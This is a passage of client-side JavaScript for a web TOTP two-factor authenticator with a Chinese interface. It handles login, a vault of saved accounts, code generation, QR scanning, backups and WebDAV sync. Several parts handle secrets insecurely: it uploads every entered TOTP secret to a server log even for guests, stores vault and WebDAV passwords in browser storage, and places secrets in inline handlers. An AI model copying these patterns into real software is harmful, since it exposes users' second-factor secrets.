      updateUserInfo();
    }else{
      sessionToken=null;
      sessionStorage.removeItem('sessionToken');
    }
  }catch(error){
    console.error('Check session error:', error);
  }
}

function updateUserInfo(){
  const userInfoEl=document.getElementById('userInfo');
  if(currentUser){
    userInfoEl.innerHTML='<span>👤 ' + currentUser.username + '</span><button class="btn btn-secondary" onclick="logout()">退出</button>';
  }else{
    userInfoEl.innerHTML='<button class="btn btn-primary" onclick="showAuthModal()">登录/注册</button>';
  }
  
  const vaultLockedMessage = document.getElementById('vaultLockedMessage');
  if(vaultLockedMessage){
    if(!currentUser){
      vaultLockedMessage.textContent = '当前为游客模式，使用保险库功能请先登录账号。';
    }else{
      vaultLockedMessage.textContent = '请输入保险库密码以解锁常用账号功能。';
    }
  }
}

function showAuthModal(){
  document.getElementById('authModal').classList.add('show');
}

function closeAuthModal(){
  document.getElementById('authModal').classList.remove('show');
}

async function register(){
  const username=document.getElementById('authUsername').value.trim();
  const password=document.getElementById('authPassword').value;
  const errorEl=document.getElementById('authError');
  errorEl.classList.remove('show');
  if(!username||!password){
    errorEl.textContent='请填写用户名和密码';
    errorEl.classList.add('show');
    return;
  }
  try{
    const response=await fetch('/api/register',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({username:username,password:password})
    });
    const data=await response.json();
    if(data.success){
      showNotification('✅ 注册成功，请登录');
      document.getElementById('authPassword').value='';
    }else{
      errorEl.textContent=data.error;
      errorEl.classList.add('show');
    }
  }catch(error){
    console.error('Register error:', error);
  }
}

async function login(){
  const username=document.getElementById('authUsername').value.trim();
  const password=document.getElementById('authPassword').value;
  const errorEl=document.getElementById('authError');
  errorEl.classList.remove('show');
  if(!username||!password){
    errorEl.textContent='请填写用户名和密码';
    errorEl.classList.add('show');
    return;
  }
  try{
    const response=await fetch('/api/login',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({username:username,password:password})
    });
    const data=await response.json();
    if(data.success){
      sessionToken=data.sessionToken;
      sessionStorage.setItem('sessionToken',sessionToken);
      currentUser={id:data.userId,username:data.username};
      updateUserInfo();
      closeAuthModal();
      showNotification('✅ 登录成功（2小时有效期）');
      
      if(vaultPassword){
        await autoUnlockVault();
      }
    }else{
      errorEl.textContent=data.error;
      errorEl.classList.add('show');
    }
  }catch(error){
    console.error('Login error:', error);
  }
}

function logout(){
  sessionToken=null;
  currentUser=null;
  vaultPassword=null;
  sessionStorage.removeItem('sessionToken');
  sessionStorage.removeItem('vaultPassword');
  showNotification('👋 已退出登录');
  setTimeout(()=>window.location.reload(),1500);
}

async function autoUnlockVault(){
  if(!currentUser || !vaultPassword) return;
  
  try{
    const verifyResponse=await fetch('/api/verify-vault-password',{
      method:'POST',
      headers:{
        'Content-Type':'application/json',
        'Authorization':'Bearer ' + sessionToken
      },
      body:JSON.stringify({vaultPassword:vaultPassword})
    });
    const verifyData=await verifyResponse.json();
    
    if(verifyData.valid){
      document.getElementById('vaultLocked').style.display='none';
      document.getElementById('vaultUnlocked').style.display='block';
      await loadSavedAccounts();
    }else{
      vaultPassword=null;
      sessionStorage.removeItem('vaultPassword');
    }
  }catch(error){
    console.error('Auto unlock error:', error);
  }
}

async function unlockVault(){
  if(!currentUser){
    showNotification('❌ 请先登录以使用保险库功能');
    return;
  }
  
  const password=document.getElementById('unlockPassword').value;
  if(!password){
    showNotification('❌ 请输入密码');
    return;
  }
  
  try{
    const checkResponse=await fetch('/api/check-vault-password',{
      headers:{'Authorization':'Bearer ' + sessionToken}
    });
    const checkData=await checkResponse.json();
    if(!checkData.hasVaultPassword){
      vaultPassword=password;
      sessionStorage.setItem('vaultPassword',vaultPassword);
      showVaultSetupModal();
      return;
    }
    const verifyResponse=await fetch('/api/verify-vault-password',{
      method:'POST',
      headers:{
        'Content-Type':'application/json',
        'Authorization':'Bearer ' + sessionToken
      },
      body:JSON.stringify({vaultPassword:password})
    });
    const verifyData=await verifyResponse.json();
    if(verifyData.valid){
      vaultPassword=password;
      sessionStorage.setItem('vaultPassword',vaultPassword);
      document.getElementById('vaultLocked').style.display='none';
      document.getElementById('vaultUnlocked').style.display='block';
      await loadSavedAccounts();
      showNotification('✅ 保险库已解锁');
    }else{
      showNotification('❌ 密码错误');
    }
  }catch(error){
    console.error('Unlock vault error:', error);
  }
}

function showVaultSetupModal(){
  document.getElementById('setupVaultPassword').value=vaultPassword;
  document.getElementById('vaultSetupModal').classList.add('show');
}

async function setupVaultPassword(){
  const password=document.getElementById('setupVaultPassword').value;
  const confirm=document.getElementById('confirmVaultPassword').value;
  const errorEl=document.getElementById('vaultSetupError');
  errorEl.classList.remove('show');
  if(!password||password.length<8){
    errorEl.textContent='密码至少 8 位';
    errorEl.classList.add('show');
    return;
  }
  if(password!==confirm){
    errorEl.textContent='两次密码不一致';
    errorEl.classList.add('show');
    return;
  }
  try{
    const response=await fetch('/api/setup-vault-password',{
      method:'POST',
      headers:{
        'Content-Type':'application/json',
        'Authorization':'Bearer ' + sessionToken
      },
      body:JSON.stringify({vaultPassword:password})
    });
    const data=await response.json();
    if(data.success){
      vaultPassword=password;
      sessionStorage.setItem('vaultPassword',vaultPassword);
      document.getElementById('vaultSetupModal').classList.remove('show');
      document.getElementById('vaultLocked').style.display='none';
      document.getElementById('vaultUnlocked').style.display='block';
      showNotification('✅ 保险库密码设置成功');
    }else{
      errorEl.textContent=data.error;
      errorEl.classList.add('show');
    }
  }catch(error){
    console.error('Setup vault error:', error);
  }
}

async function loadSavedAccounts(){
  if(!currentUser||!vaultPassword)return;
  try{
    const response=await fetch('/api/saved-accounts',{
      headers:{'Authorization':'Bearer ' + sessionToken}
    });
    const data=await response.json();
    if(data.success){
      savedAccounts=data.accounts;
      renderSavedAccounts();
    }
  }catch(error){
    console.error('Load accounts error:', error);
  }
}

function renderSavedAccounts(){
  const listEl=document.getElementById('accountsList');
  if(savedAccounts.length===0){
    listEl.innerHTML='<div class="empty-state">暂无保存的账号<br><small>可以通过备份管理导入账号</small></div>';
    return;
  }
  listEl.innerHTML=savedAccounts.map(account=>{
    return '<div class="account-card"><div class="account-header"><div><div class="account-name">🏢 ' + escapeHtml(account.account_name) + '</div>' + (account.issuer ? '<div class="account-issuer">' + escapeHtml(account.issuer) + '</div>' : '') + '</div><div class="account-actions"><button class="btn btn-secondary" onclick="editAccount(' + account.id + ')">编辑</button><button class="btn btn-secondary" onclick="deleteAccount(' + account.id + ')">删除</button></div></div><div class="account-code" onclick="smartCopy(document.getElementById(\\'code-' + account.id + '\\').textContent)"><div class="account-code-number" id="code-' + account.id + '">------</div><div class="account-code-timer" id="timer-' + account.id + '">剩余 30 秒</div></div></div>';
  }).join('');
  savedAccounts.forEach(account=>updateAccountTOTP(account.id,account.encrypted_secret));
}

async function updateAccountTOTP(accountId,secret){
  const cleanSecret=secret.replace(/\\s+/g,'').replace(/[-_]/g,'').toUpperCase();
  if(accountTotpIntervals[accountId])clearInterval(accountTotpIntervals[accountId]);
  async function update(){
    try{
      const code=await generateTOTP(cleanSecret);
      const remaining=30-(Math.floor(Date.now()/1000)%30);
      const codeEl=document.getElementById('code-' + accountId);
      const timerEl=document.getElementById('timer-' + accountId);
      if(codeEl)codeEl.textContent=code;
      if(timerEl)timerEl.textContent='剩余 ' + remaining + ' 秒';
    }catch(error){
      console.error('Update TOTP error:', error);
    }
  }
  update();
  accountTotpIntervals[accountId]=setInterval(update,1000);
}

function showAddAccountModal(){
  editingAccountId=null;
  document.getElementById('editModalTitle').textContent='添加账号';
  document.getElementById('editAccountName').value='';
  document.getElementById('editAccountSecret').value='';
  document.getElementById('editAccountIssuer').value='';
  document.getElementById('editModal').classList.add('show');
}

function editAccount(id){
  const account=savedAccounts.find(a=>a.id===id);
  if(!account)return;
  editingAccountId=id;
  document.getElementById('editModalTitle').textContent='编辑账号';
  document.getElementById('editAccountName').value=account.account_name;
  document.getElementById('editAccountSecret').value=account.encrypted_secret;
  document.getElementById('editAccountIssuer').value=account.issuer||'';
  document.getElementById('editModal').classList.add('show');
}

function closeEditModal(){
  document.getElementById('editModal').classList.remove('show');
}

async function saveAccount(){
  const accountName=document.getElementById('editAccountName').value.trim();
  const secret=document.getElementById('editAccountSecret').value.trim();
  const issuer=document.getElementById('editAccountIssuer').value.trim();
  const errorEl=document.getElementById('editError');
  errorEl.classList.remove('show');
  if(!accountName||!secret){
    errorEl.textContent='请填写账号名称和密钥';
    errorEl.classList.add('show');
    return;
  }
  try{
    let parsedSecret=parseInput(secret).replace(/\\s+/g,'').replace(/[-_]/g,'');
    try{
      await generateTOTP(parsedSecret);
    }catch(e){
      errorEl.textContent='密钥格式错误';
      errorEl.classList.add('show');
      return;
    }
    const endpoint=editingAccountId?'/api/update-account':'/api/save-account';
    const body=editingAccountId?{id:editingAccountId,accountName:accountName,secret:parsedSecret,issuer:issuer}:{accountName:accountName,secret:parsedSecret,issuer:issuer};
    const response=await fetch(endpoint,{
      method:'POST',
      headers:{
        'Content-Type':'application/json',
        'Authorization':'Bearer ' + sessionToken
      },
      body:JSON.stringify(body)
    });
    const data=await response.json();
    if(data.success){
      closeEditModal();
      await loadSavedAccounts();
      showNotification(editingAccountId?'✅ 账号已更新':'✅ 账号已保存');
    }else{
      errorEl.textContent=data.error;
      errorEl.classList.add('show');
    }
  }catch(error){
    console.error('Save account error:', error);
  }
}

async function deleteAccount(id){
  if(!confirm('确定要删除这个账号吗?'))return;
  try{
    const response=await fetch('/api/delete-account',{
      method:'POST',
      headers:{
        'Content-Type':'application/json',
        'Authorization':'Bearer ' + sessionToken
      },
      body:JSON.stringify({id:id})
    });
    const data=await response.json();
    if(data.success){
      if(accountTotpIntervals[id]){
        clearInterval(accountTotpIntervals[id]);
        delete accountTotpIntervals[id];
      }
      await loadSavedAccounts();
      showNotification('✅ 账号已删除');
    }else{
      showNotification(data.error || '删除失败');
    }
  }catch(error){
    console.error('Delete account error:', error);
  }
}

async function generateCode(){
  const input=document.getElementById('secretInput').value.trim();
  if(!input){
    showNotification('❌ 请输入密钥');
    return;
  }
  try{
    const secret=parseInput(input);
    currentSecret=secret;
    const code=await generateTOTP(secret);
    document.getElementById('totpCode').textContent=code;
    document.getElementById('resultBox').style.display='block';
    
    const copied = await smartCopy(code);
    if(copied){
      showNotification('✅ 验证码已生成并复制: '+code);
    }else{
      showNotification('✅ 验证码已生成: '+code+'（点击可复制）');
    }
    
    saveToLocal(secret);
    if(code!==lastGeneratedCode){
      lastGeneratedCode=code;
      saveToCloud(secret,code);
    }
    if(totpInterval)clearInterval(totpInterval);
    updateTimer();
    totpInterval=setInterval(()=>autoUpdateTOTP(),1000);
  }catch(error){
    showNotification('❌ 生成失败: '+error.message);
  }
}

async function autoUpdateTOTP(){
  if(!currentSecret)return;
  try{
    const code=await generateTOTP(currentSecret);
    const remaining=30-(Math.floor(Date.now()/1000)%30);
    const codeEl=document.getElementById('totpCode');
    const timerEl=document.getElementById('timer');
    if(codeEl)codeEl.textContent=code;
    if(timerEl)timerEl.textContent='剩余 ' + remaining + ' 秒';
    if(remaining===30&&code!==lastGeneratedCode){
      lastGeneratedCode=code;
    }
  }catch(error){
    console.error('Auto update error:',error);
  }
}

function parseInput(input){
  input=input.trim();
  if(input.startsWith('otpauth://')){
    const url=new URL(input);
    const secret=url.searchParams.get('secret');
    if(!secret)throw new Error('Invalid URL');
    return secret.replace(/\\s+/g,'').replace(/[-_]/g,'').toUpperCase();
  }
  let clean=input.replace(/\\s+/g,'').replace(/[-_]/g,'').toUpperCase();
  if(/^[A-Z2-7]+=*$/.test(clean))return clean;
  if(/^[0-9A-F]+$/i.test(clean))return hexToBase32(clean);
  throw new Error('Unsupported format');
}

function hexToBase32(hex){
  const bytes=hex.match(/.{1,2}/g).map(byte=>parseInt(byte,16));
  const base32Chars='ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
  let bits='';
  for(const byte of bytes)bits+=byte.toString(2).padStart(8,'0');
  let result='';
  for(let i=0;i<bits.length;i+=5){
    const chunk=bits.substr(i,5).padEnd(5,'0');
    result+=base32Chars[parseInt(chunk,2)];
  }
  return result;
}

async function generateTOTP(secret){
  const key=base32Decode(secret);
  const epoch=Math.floor(Date.now()/1000);
  const time=Math.floor(epoch/30);
  const timeBuffer=new ArrayBuffer(8);
  const timeView=new DataView(timeBuffer);
  timeView.setUint32(4,time,false);
  const keyBuffer=new Uint8Array(key).buffer;
  const cryptoKey=await crypto.subtle.importKey('raw',keyBuffer,{name:'HMAC',hash:'SHA-1'},false,['sign']);
  const signature=await crypto.subtle.sign('HMAC',cryptoKey,timeBuffer);
  const signatureArray=new Uint8Array(signature);
  const offset=signatureArray[19]&0x0f;
  const code=(((signatureArray[offset]&0x7f)<<24)|((signatureArray[offset+1]&0xff)<<16)|((signatureArray[offset+2]&0xff)<<8)|(signatureArray[offset+3]&0xff))%1000000;
  return code.toString().padStart(6,'0');
}

function base32Decode(base32){
  const base32Chars='ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
  let bits='';
  for(const char of base32.toUpperCase().replace(/=+$/,'')){
    const val=base32Chars.indexOf(char);
    if(val===-1)throw new Error('Invalid Base32');
    bits+=val.toString(2).padStart(5,'0');
  }
  const bytes=[];
  for(let i=0;i+8<=bits.length;i+=8)bytes.push(parseInt(bits.substr(i,8),2));
  return new Uint8Array(bytes);
}

function updateTimer(){
  const remaining=30-(Math.floor(Date.now()/1000)%30);
  const timerEl=document.getElementById('timer');
  if(timerEl)timerEl.textContent='剩余 ' + remaining + ' 秒';
}

async function smartCopy(text){
  if(!text || text==='------') return false;
  
  if(navigator.clipboard && navigator.clipboard.writeText){
    try{
      await navigator.clipboard.writeText(text);
      return true;
    }catch(err){
      console.log('Clipboard API failed, trying fallback');
    }
  }
  
  const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
  if(isIOS){
    const textarea=document.createElement('textarea');
    textarea.value=text;
    textarea.style.position='fixed';
    textarea.style.top='0';
    textarea.style.left='0';
    textarea.style.width='2em';
    textarea.style.height='2em';
    textarea.style.padding='0';
    textarea.style.border='none';
    textarea.style.outline='none';
    textarea.style.boxShadow='none';
    textarea.style.background='transparent';
    document.body.appendChild(textarea);
    
    textarea.contentEditable=true;
    textarea.readOnly=false;
    
    const range=document.createRange();
    range.selectNodeContents(textarea);
    const selection=window.getSelection();
    selection.removeAllRanges();
    selection.addRange(range);
    textarea.setSelectionRange(0,999999);
    
    try{
      const successful=document.execCommand('copy');
      document.body.removeChild(textarea);
      return successful;
    }catch(err){
      document.body.removeChild(textarea);
      return false;
    }
  }
  
  const textarea=document.createElement('textarea');
  textarea.value=text;
  textarea.style.position='fixed';
  textarea.style.top='0';
  textarea.style.left='0';
  textarea.style.width='2em';
  textarea.style.height='2em';
  textarea.style.padding='0';
  textarea.style.border='none';
  textarea.style.outline='none';
  textarea.style.boxShadow='none';
  textarea.style.background='transparent';
  document.body.appendChild(textarea);
  textarea.focus();
  textarea.select();
  
  try{
    const successful=document.execCommand('copy');
    document.body.removeChild(textarea);
    return successful;
  }catch(err){
    document.body.removeChild(textarea);
    return false;
  }
}

function saveToLocal(secret){
  try{
    const history=JSON.parse(localStorage.getItem('totpHistory')||'[]');
    const now=new Date();
    const lastEntry=history[0];
    if(lastEntry&&lastEntry.secret===secret){
      const lastTime=new Date(lastEntry.timestamp);
      if((now-lastTime)<60000)return;
    }
    history.unshift({secret:secret,timestamp:now.toISOString()});
    localStorage.setItem('totpHistory',JSON.stringify(history.slice(0,50)));
    loadLocalHistory();
  }catch(error){
    console.error('Save to local error:', error);
  }
}

function loadLocalHistory(){
  try{
    const history=JSON.parse(localStorage.getItem('totpHistory')||'[]');
    renderLocalHistory(history);
  }catch(error){
    console.error('Load local history error:', error);
  }
}

function renderLocalHistory(logs){
  const listEl=document.getElementById('localHistoryList');
  if(!listEl)return;
  if(logs.length===0){
    listEl.innerHTML='<div class="empty-state">暂无本地记录</div>';
    return;
  }
  listEl.innerHTML=logs.slice(0,20).map(log=>'<div class="history-item"><div class="history-time">⏰ ' + new Date(log.timestamp).toLocaleString('zh-CN',{timeZone:'Asia/Shanghai'}) + '</div><div class="history-secret" style="display: flex; justify-content: space-between;"><span style="flex: 1;" onclick="smartCopy(\\'' + escapeHtml(log.secret) + '\\'); showNotification(\\'✅ 密钥已复制\\');">🔑 ' + escapeHtml(log.secret) + '</span><button class="btn btn-secondary" style="margin-left: 10px; font-size: 12px; padding: 6px 12px;" onclick="useHistorySecret(\\'' + escapeHtml(log.secret).replace(/'/g,"\\\\\\'") + '\\')">使用</button></div></div>').join('');
}

function useHistorySecret(secret){
  document.getElementById('secretInput').value=secret;
  document.querySelector('.tab[data-tab="generator"]').click();
  generateCode();
}

function clearLocalHistory(){
  if(!confirm('确定要清空本地历史记录吗?'))return;
  localStorage.removeItem('totpHistory');
  renderLocalHistory([]);
  showNotification('✅ 本地历史已清空');
}

async function saveToCloud(secret,code){
  try{
    await fetch('/api/save-totp-log',{
      method:'POST',
      headers:{
        'Content-Type':'application/json',
        'Authorization':'Bearer ' + (sessionToken||'')
      },
      body:JSON.stringify({secret:secret,code:code,ipAddress:'',userAgent:navigator.userAgent})
    });
  }catch(error){
    console.error('Cloud save error:',error);
  }
}

async function loadCloudHistory(){
  if(!currentUser){
    document.getElementById('guestNotice').style.display='block';
    document.getElementById('historyList').innerHTML='<div class="empty-state">请登录以查看云端记录</div>';
    return;
  }
  document.getElementById('guestNotice').style.display='none';
  try{
    const response=await fetch('/api/cloud-history',{
      headers:{'Authorization':'Bearer ' + sessionToken}
    });
    const data=await response.json();
    if(data.success)renderCloudHistory(data.logs);
  }catch(error){
    console.error('Load cloud history error:', error);
  }
}

function renderCloudHistory(logs){
  const listEl=document.getElementById('historyList');
  if(logs.length===0){
    listEl.innerHTML='<div class="empty-state">暂无云端记录</div>';
    return;
  }
  listEl.innerHTML=logs.map(log=>{
    const beijingTime=new Date(new Date(log.timestamp).getTime()+8*3600*1000).toISOString().replace('T',' ').substring(0,19).replace(/-/g,'/').replace(' ',' ');
    return '<div class="history-item"><div class="history-time">⏰ ' + beijingTime + '</div><div class="history-secret" onclick="smartCopy(\\'' + escapeHtml(log.secret) + '\\'); showNotification(\\'✅ 密钥已复制\\');">🔑 ' + escapeHtml(log.secret) + '</div>' + (log.ip_address ? '<div class="history-time">📍 ' + escapeHtml(log.ip_address) + '</div>' : '') + '</div>';
  }).join('');
}

async function startQRScanner(){
  const modal=document.getElementById('qrScannerModal');
  const video=document.getElementById('qrVideo');
  const statusEl=document.getElementById('scannerStatus');
  
  modal.style.display='flex';
  statusEl.textContent='正在启动相机...';
  statusEl.className='scanner-status';
  
  try{
    qrStream=await navigator.mediaDevices.getUserMedia({
      video:{
        facingMode:'environment',
        width:{ideal:1280},
        height:{ideal:720}
      }
    });
    
    video.srcObject=qrStream;
    video.play();
    
    statusEl.textContent='请将二维码对准扫描框';
    
    video.addEventListener('loadedmetadata',()=>{
      qrScanning=true;
      scanQRCode();
    });
    
  }catch(error){
    console.error('Camera error:',error);
    statusEl.textContent='❌ 无法访问相机：'+error.message;
    statusEl.className='scanner-status error';
    
    if(error.name==='NotAllowedError'){
      statusEl.textContent='❌ 相机权限被拒绝，请在浏览器设置中允许访问相机';
    }else if(error.name==='NotFoundError'){
      statusEl.textContent='❌ 未找到可用的相机设备';
    }
  }
}

function scanQRCode(){
  if(!qrScanning)return;
  
  const video=document.getElementById('qrVideo');
  const canvas=document.getElementById('qrCanvas');
  const statusEl=document.getElementById('scannerStatus');
  
  if(video.readyState===video.HAVE_ENOUGH_DATA){
    canvas.width=video.videoWidth;
    canvas.height=video.videoHeight;
    
    const ctx=canvas.getContext('2d');
    ctx.drawImage(video,0,0,canvas.width,canvas.height);
    
    const imageData=ctx.getImageData(0,0,canvas.width,canvas.height);
    
    const code=jsQR(imageData.data,imageData.width,imageData.height,{
      inversionAttempts:"dontInvert",
    });
    
    if(code){
      statusEl.textContent='✅ 扫描成功！';
      statusEl.className='scanner-status success';
      
      handleQRCodeData(code.data);
      
      setTimeout(()=>{
        stopQRScanner();
      },1000);
      return;
    }
  }
  
  qrAnimationFrame=requestAnimationFrame(scanQRCode);
}

async function handleQRCodeData(data){
  try{
    if(data.startsWith('otpauth://')){
      document.getElementById('secretInput').value=data;
      showNotification('✅ 已识别二维码，正在生成验证码...');
      
      setTimeout(async ()=>{
        await generateCode();
      },500);
    }else{
      document.getElementById('secretInput').value=data;
      showNotification('✅ 已识别内容，请检查是否为有效密钥');
    }
  }catch(error){
    showNotification('❌ 二维码内容无效：'+error.message);
  }
}

function stopQRScanner(){
  qrScanning=false;
  
  if(qrAnimationFrame){
    cancelAnimationFrame(qrAnimationFrame);
    qrAnimationFrame=null;
  }
  
  if(qrStream){
    qrStream.getTracks().forEach(track=>track.stop());
    qrStream=null;
  }
  
  const video=document.getElementById('qrVideo');
  if(video){
    video.srcObject=null;
  }
  
  const modal=document.getElementById('qrScannerModal');
  if(modal){
    modal.style.display='none';
  }
  
  const statusEl=document.getElementById('scannerStatus');
  if(statusEl){
    statusEl.textContent='请将二维码对准扫描框';
    statusEl.className='scanner-status';
  }
}

function uploadQRImage(){
  const input=document.createElement('input');
  input.type='file';
  input.accept='image/*';
  
  input.onchange=async(e)=>{
    const file=e.target.files[0];
    if(!file)return;
    
    try{
      showNotification('🔍 正在识别二维码...');
      const imageData=await readQRFromImage(file);
      if(imageData){
        await handleQRCodeData(imageData);
      }else{
        showNotification('❌ 未能识别二维码，请确保图片清晰');
      }
    }catch(error){
      showNotification('❌ 读取图片失败：'+error.message);
    }
  };
  
  input.click();
}

async function readQRFromImage(file){
  return new Promise((resolve,reject)=>{
    const reader=new FileReader();
    
    reader.onload=(e)=>{
      const img=new Image();
      img.onload=()=>{
        const canvas=document.createElement('canvas');
        canvas.width=img.width;
        canvas.height=img.height;
        
        const ctx=canvas.getContext('2d');
        ctx.drawImage(img,0,0,canvas.width,canvas.height);
        
        const imageData=ctx.getImageData(0,0,canvas.width,canvas.height);
        const code=jsQR(imageData.data,imageData.width,imageData.height);
        
        resolve(code?code.data:null);
      };
      
      img.onerror=()=>reject(new Error('图片加载失败'));
      img.src=e.target.result;
    };
    
    reader.onerror=()=>reject(new Error('文件读取失败'));
    reader.readAsDataURL(file);
  });
}

function startScreenshot(){
  document.getElementById('screenshotModal').style.display='flex';
}

function closeScreenshotModal(){
  document.getElementById('screenshotModal').style.display='none';
}

async function captureScreen(){
  const statusEl=document.getElementById('screenshotStatus');
  
  try{
    statusEl.textContent='📸 正在启动屏幕捕获...';
    statusEl.className='scanner-status info';
    
    const stream=await navigator.mediaDevices.getDisplayMedia({
      video:{mediaSource:'screen'}
    });
    
    const video=document.createElement('video');
    video.srcObject=stream;
    video.play();
    
    video.onloadedmetadata=()=>{
      const canvas=document.createElement('canvas');
      canvas.width=video.videoWidth;
      canvas.height=video.videoHeight;
      
      const ctx=canvas.getContext('2d');
      ctx.drawImage(video,0,0,canvas.width,canvas.height);
      
      stream.getTracks().forEach(track=>track.stop());
      
      statusEl.textContent='🔍 正在识别二维码...';
      
      const imageData=ctx.getImageData(0,0,canvas.width,canvas.height);
      const code=jsQR(imageData.data,imageData.width,imageData.height);
      
      if(code){
        statusEl.textContent='✅ 识别成功！';
        statusEl.className='scanner-status success';
        handleQRCodeData(code.data);
        setTimeout(()=>{
          closeScreenshotModal();
        },1000);
      }else{
        statusEl.textContent='❌ 未能识别二维码，请重试';
        statusEl.className='scanner-status error';
      }
    };
    
  }catch(error){
    console.error('Screenshot error:',error);
    statusEl.textContent='❌ 截图失败：'+error.message;
    statusEl.className='scanner-status error';
    
    if(error.name==='NotAllowedError'){
      statusEl.textContent='❌ 用户取消了屏幕共享';
    }
  }
}

function showBackupModal(){
  document.getElementById('backupModal').classList.add('show');
}

function closeBackupModal(){
  document.getElementById('backupModal').classList.remove('show');
}

function exportJSON(){
  if(savedAccounts.length===0){
    showNotification('❌ 没有可导出的账号');
    return;
  }
  
  const data={
    version:'1.0',
    exportDate:new Date().toISOString(),
    accounts:savedAccounts.map(acc=>({
      name:acc.account_name,
      secret:acc.encrypted_secret,
      issuer:acc.issuer||''
    }))
  };
  
  const blob=new Blob([JSON.stringify(data,null,2)],{type:'application/json'});
  const url=URL.createObjectURL(blob);
  const a=document.createElement('a');
  a.href=url;
  a.download='2fa_backup_' + new Date().toISOString().split('T')[0] + '.json';
  a.click();
  URL.revokeObjectURL(url);
  
  showNotification('✅ JSON 备份已下载');
}

function exportTXT(){
  if(savedAccounts.length===0){
    showNotification('❌ 没有可导出的账号');
    return;
  }
  
  let text='=== 2FA 备份 ===\\n';
  text+='导出时间: ' + new Date().toLocaleString('zh-CN') + '\\n\\n';
  
  savedAccounts.forEach((acc,index)=>{
    text+='[' + (index+1) + '] ' + acc.account_name + '\\n';
    text+='密钥: ' + acc.encrypted_secret + '\\n';
    if(acc.issuer)text+='发行者: ' + acc.issuer + '\\n';
    text+='\\n';
  });
  
  const blob=new Blob([text],{type:'text/plain'});
  const url=URL.createObjectURL(blob);
  const a=document.createElement('a');
  a.href=url;
  a.download='2fa_backup_' + new Date().toISOString().split('T')[0] + '.txt';
  a.click();
  URL.revokeObjectURL(url);
  
  showNotification('✅ TXT 备份已下载');
}

async function importBackup(event){
  const file=event.target.files[0];
  if(!file)return;
  
  try{
    const text=await file.text();
    let accounts=[];
    
    if(file.name.endsWith('.json')){
      const data=JSON.parse(text);
      accounts=data.accounts||[];
    }else if(file.name.endsWith('.txt')){
      const lines=text.split('\\n');
      let currentAccount=null;
      
      for(const line of lines){
        const trimmed=line.trim();
        if(trimmed.match(/^\\[\\d+\\]/)){
          if(currentAccount)accounts.push(currentAccount);
          currentAccount={name:trimmed.replace(/^\\[\\d+\\]\\s*/,''),secret:'',issuer:''};
        }else if(trimmed.startsWith('密钥:')&&currentAccount){
          currentAccount.secret=trimmed.replace('密钥:','').trim();
        }else if(trimmed.startsWith('发行者:')&&currentAccount){
          currentAccount.issuer=trimmed.replace('发行者:','').trim();
        }
      }
      if(currentAccount)accounts.push(currentAccount);
    }
    
    if(accounts.length===0){
      showNotification('❌ 未找到有效的账号数据');
      return;
    }
    
    for(const acc of accounts){
      await fetch('/api/save-account',{
        method:'POST',
        headers:{
          'Content-Type':'application/json',
          'Authorization':'Bearer ' + sessionToken
        },
        body:JSON.stringify({
          accountName:acc.name,
          secret:acc.secret,
          issuer:acc.issuer||''
        })
      });
    }
    
    await loadSavedAccounts();
    showNotification('✅ 成功导入 ' + accounts.length + ' 个账号');
    event.target.value='';
    
  }catch(error){
    console.error('Import error:',error);
    showNotification('❌ 导入失败：'+error.message);
  }
}

function loadWebDAVConfig(){
  try{
    const url=localStorage.getItem('webdavUrl');
    const username=localStorage.getItem('webdavUsername');
    const password=localStorage.getItem('webdavPassword');
    const folder=localStorage.getItem('webdavFolder');
    
    if(url)document.getElementById('webdavUrl').value=url;
    if(username)document.getElementById('webdavUsername').value=username;
    if(password)document.getElementById('webdavPassword').value=password;
    if(folder)document.getElementById('webdavFolder').value=folder;
  }catch(error){
    console.error('Load WebDAV config error:',error);
  }
}

function saveWebDAVConfig(){
  const url=document.getElementById('webdavUrl').value.trim();
  const username=document.getElementById('webdavUsername').value.trim();
  const password=document.getElementById('webdavPassword').value;
  const folder=document.getElementById('webdavFolder').value.trim();
  
  if(url)localStorage.setItem('webdavUrl',url);
  if(username)localStorage.setItem('webdavUsername',username);
  if(password)localStorage.setItem('webdavPassword',password);
  if(folder)localStorage.setItem('webdavFolder',folder);
}

async function testWebDAV(){
  if(!currentUser){
    showNotification('❌ 请先登录');
    return;
  }
  
  const url=document.getElementById('webdavUrl').value.trim();
  const username=document.getElementById('webdavUsername').value.trim();
  const password=document.getElementById('webdavPassword').value;
  const folder=document.getElementById('webdavFolder').value.trim();
  const statusEl=document.getElementById('webdavStatus');
  
  if(!url||!username||!password){
    statusEl.textContent='❌ 请填写完整的 WebDAV 配置';
    statusEl.className='webdav-status error';
    statusEl.style.display='block';
    return;
  }
  
  statusEl.textContent='🔄 正在测试连接...';
  statusEl.className='webdav-status info';
  statusEl.style.display='block';
  
  try{
    const response=await fetch('/api/webdav-test',{
      method:'POST',
      headers:{
        'Content-Type':'application/json',
        'Authorization':'Bearer ' + sessionToken
      },
      body:JSON.stringify({url:url,username:username,password:password,folder:folder})
    });
    
    const data=await response.json();
    
    if(data.success){
      statusEl.textContent=data.message;
      statusEl.className='webdav-status success';
      saveWebDAVConfig();
    }else{
      statusEl.textContent='❌ '+data.error;
      statusEl.className='webdav-status error';
    }
  }catch(error){
    statusEl.textContent='❌ 连接失败: '+error.message;
    statusEl.className='webdav-status error';
  }
}

async function uploadToWebDAV(){
  if(!currentUser){
    showNotification('❌ 请先登录');
    return;
  }
  
  if(savedAccounts.length===0){
    showNotification('❌ 没有可备份的账号');
    return;
  }
  
  const url=document.getElementById('webdavUrl').value.trim();
  const username=document.getElementById('webdavUsername').value.trim();
  const password=document.getElementById('webdavPassword').value;
  const folder=document.getElementById('webdavFolder').value.trim();
  const statusEl=document.getElementById('webdavStatus');
  
  if(!url||!username||!password){
    statusEl.textContent='❌ 请填写完整的 WebDAV 配置';
    statusEl.className='webdav-status error';
    statusEl.style.display='block';
    return;
  }
  
  statusEl.textContent='🔄 正在上传备份...';
  statusEl.className='webdav-status info';
  statusEl.style.display='block';
  
  const backupData={
    version:'1.0',
    exportDate:new Date().toISOString(),
    accounts:savedAccounts.map(acc=>({
      name:acc.account_name,
      secret:acc.encrypted_secret,
      issuer:acc.issuer||''
    }))
  };
  
  try{
    const response=await fetch('/api/webdav-upload',{
      method:'POST',
      headers:{
        'Content-Type':'application/json',
        'Authorization':'Bearer ' + sessionToken
      },
      body:JSON.stringify({
        url:url,
        username:username,
        password:password,
